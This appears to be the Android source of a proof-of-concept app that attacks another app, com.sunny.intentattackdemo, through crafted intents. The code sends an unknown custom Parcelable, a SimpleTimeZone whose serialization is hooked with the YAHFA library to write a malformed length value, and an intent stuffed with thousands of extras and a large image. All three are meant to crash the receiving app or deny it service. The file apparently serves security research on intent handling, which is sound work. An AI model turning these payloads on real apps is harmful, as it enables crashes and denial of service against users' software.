package com.sunny.poc;

import androidx.appcompat.app.AppCompatActivity;
import lab.galaxy.yahfa.HookMain;

import android.content.Intent;
import android.content.res.AssetManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.BaseBundle;
import android.os.Bundle;
import android.view.View;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.SimpleTimeZone;

public class MainActivity extends AppCompatActivity {

    private Intent mPocIntent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    /**
     * 发送自定义的序列化对象
     *
     * @param view
     */
    public void sendCustomParcelable(View view) {
        mPocIntent = new Intent();
        mPocIntent.setClassName("com.sunny.intentattackdemo", "com.sunny.intentattackdemo" +
                ".MainActivity");
        mPocIntent.putExtra("AnyKey", new SunnyParcelableObj("sunny", "Shenzhen", 18));
        startActivity(mPocIntent);

    }

    /**
     * 发送精心构造的Parcelable对象
     *
     * @param view
     */
    public void sendSpecialParcelable(View view) {
        try {
            Class simpleTimeZoneClz = Class.forName("java.util.SimpleTimeZone");
            Method origin = simpleTimeZoneClz.getDeclaredMethod("writeObject",
                    ObjectOutputStream.class);
            Method hookMethod = MainActivity.class.getDeclaredMethod("writeObjectOvrride",
                    Object.class, ObjectOutputStream.class);
            HookMain.hook(origin, hookMethod);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        SimpleTimeZone simpleTimeZone = new SimpleTimeZone(0, "1");
        mPocIntent = new Intent();
        mPocIntent.setClassName("com.sunny.intentattackdemo", "com.sunny.intentattackdemo" +
                ".MainActivity");
        mPocIntent.putExtra("AnyKey", simpleTimeZone);
        startActivity(mPocIntent);

    }

    /**
     * @param view
     */
    public void eatBadParcelableException(View view) {
        if (mPocIntent != null && mPocIntent.getExtras() != null) {

        }

    }

    /**
     * 重置
     *
     * @param view
     */
    public void reset(View view) {

    }

    public static void writeObjectOvrride(Object obj, ObjectOutputStream stream) {
        // Construct a binary rule
        // Write out the 1.1 FCS rules
        try {
            stream.defaultWriteObject();

            // Write out the binary rules in the optional data area of the stream.
            stream.writeInt(Integer.MAX_VALUE);
//            stream.write(rules);
//            stream.writeObject(times);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Intent传递大数据
     *
     * @param view
     */
    public void sendBigData(View view) {

        String data = "Sunny";
        mPocIntent = new Intent();
        mPocIntent.setClassName("com.sunny.intentattackdemo", "com.sunny.intentattackdemo" +
                ".MainActivity");
        for (int i = 0; i < 5000; i++) {
            mPocIntent.putExtra("key" + i, data);
        }
        try {
            InputStream is = getAssets().open("bigpic.jpg", AssetManager.ACCESS_RANDOM);
            Bitmap bigDataBm = BitmapFactory.decodeStream(is);
            try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()) {
                bigDataBm.compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream);
                byte[] bytes = byteArrayOutputStream.toByteArray();
                mPocIntent.putExtra("pic", bytes);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        startActivity(mPocIntent);
    }
}